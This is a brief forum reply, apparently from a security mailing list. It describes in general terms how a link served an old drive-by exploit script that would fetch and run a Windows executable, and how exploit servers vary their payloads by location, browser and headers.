Really?

That amused you?

Maybe my irony detector is on the blink, but that was very ordinary 
several years ago.

Ummmm -- not what I got at all.

I got a very old, very common multi-exploit script that, if successful, 
(that is, if run on a sufficiently old, sufficiently unpatched, system) 
would have downloaded and executed a PE that was only just very 
recently (a bit less than three hours ago) submitted to VirusTotal, 
with these results:

Of course, what you get served from any given "exploit script" URL can 
vary greatly, from hour-to-hour, GeoIP-to-GeoIP, and equally amongst 
apparent browser User-Agents (including OS (OS x vs. Windows vs. 
others) and even OS version (XP vs. Vista/Win7), etc), HTTP referer 
headers, presence or absense or contents of cookies, and so on and so 
forth...
